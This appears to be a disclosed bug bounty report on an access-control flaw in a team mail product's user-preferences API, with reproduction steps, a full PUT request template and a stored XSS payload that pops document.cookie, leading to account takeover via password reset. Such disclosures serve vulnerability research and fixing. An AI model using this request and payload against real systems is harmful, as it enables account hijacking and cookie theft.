# IDOR on update user preferences

## Report Details
- **Report ID**: 854290
- **URL**: https://hackerone.com/reports/854290
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-20T14:37:10.118Z
- **Disclosed**: 2020-05-13T19:52:07.215Z

## Reporter
- **Username**: macasun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: palo_alto_software

## Vulnerability Information
## Summary:
Team member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.

## Steps To Reproduce:

  1. Login in as user1 (the user with role `admin`) and invite user2 (set his role to `user`).
  2. Login in as user2, open Mail tab and select user1 from `Conversation assignment` dropdown (see F796149 attachment).
  3. Open network tools in the browser devTools or open local proxy and copy `UserUuid` (`da4f313f-e21e-4b5f-b2da-42d9864716f6` in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.
  4. Use template `request1` to create http request. Change `{user1-uuid}` to user1 Uuid, `{user2-cookie}` to user2 cookie. In the request body: `{attacker-email}` to email controlled by user2, `signature` to the following: `<p style=\"margin:0;\">User Signature2<img src=x onerror=alert(document.cookie) ></p>`. Send request.
  5. Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see F796148 attachment).
  6. Open https://app.outpost.co/sign-in/help and paste `{attacker-email}`. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.

## Supporting Material/References:

- request1 template:

```
PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
Host: api.outpost.co
Content-Length: 434
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Dnt: 1
Content-Type: application/json
Accept: */*
Origin: https://app.outpost.co
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Referer: https://app.outpost.co/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7
Cookie: auth={user2-cookie}

{
  "firstName": "user1-changed-by-user2",
  "lastName": "null",
  "email": "{attacker-email}",
  "role": "USER",
  "defaultMailboxUuid": "",
  "mailboxUuids": [
    "e4a63ae3-bb10-46f8-be28-a2660a2344ec"
  ],
  "signature": "{signature}",
  "timezone": "Europe/Moscow",
  "defaultSendAndResolve": false,
  "selectFirstConversation": true
}
```

## Impact

An attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.

## Attachments
- s2.jpg
- s1.jpg
